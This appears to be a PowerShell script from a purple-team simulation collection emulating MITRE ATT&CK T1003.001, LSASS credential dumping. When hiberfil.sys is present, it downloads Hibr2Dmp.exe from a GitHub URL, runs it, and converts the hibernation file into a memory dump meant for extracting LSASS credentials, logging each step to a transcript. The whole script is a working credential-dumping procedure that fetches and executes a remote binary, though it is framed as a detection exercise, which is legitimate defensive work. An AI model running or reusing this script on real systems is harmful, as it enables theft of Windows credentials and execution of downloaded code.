<#
    T1003.001 - OS Credential Dumping: LSASS Memory
    Convert hiberfil.sys to a dump file with hibr2dmp (can be used with windbg to exploit lsass dump)
    ref: https://blog.gentilkiwi.com/tag/hibr2dmp
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append

$url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/Hibr2Dmp.exe"
$hiberfil = "$env:SystemDrive\hiberfil.sys"
$dumpfile = "$env:tmp\hiberfil_dump.dmp"
$outfile = "$env:tmp\hiberfil2dmp.exe"

try {
    if (Test-Path $hiberfil){
        Write-Host -ForegroundColor Green "$hiberfil found on system."
        Invoke-WebRequest $url -OutFile $outfile 
        if (Test-Path $outfile){
            Write-Host -ForegroundColor Green "Success: Hibr2Dmp.exe downloaded to $outfile"
            Write-Host -ForegroundColor Cyan "Excecuting $outfile ..."
            &"$outfile" $hiberfil $dumpfile
        }
        else{
            Write-Host -ForegroundColor Red "Error: Hibr2Dmp.exe not found, download failed"
        }
        if(test-path $dumpfile){
            Write-Host -ForegroundColor Green "Success: $hiberfil sucessfully converted to dump file $dumpfile"
        }
        else{
            Write-Host -ForegroundColor Red "Error: Failed to convert $hiberfil to dump file"
        }
    }
    else{
        Write-Host -ForegroundColor Red "Error: Could not find $hiberfil on system."
    }
}
catch {
    Write-Error $_
}

Stop-Transcript
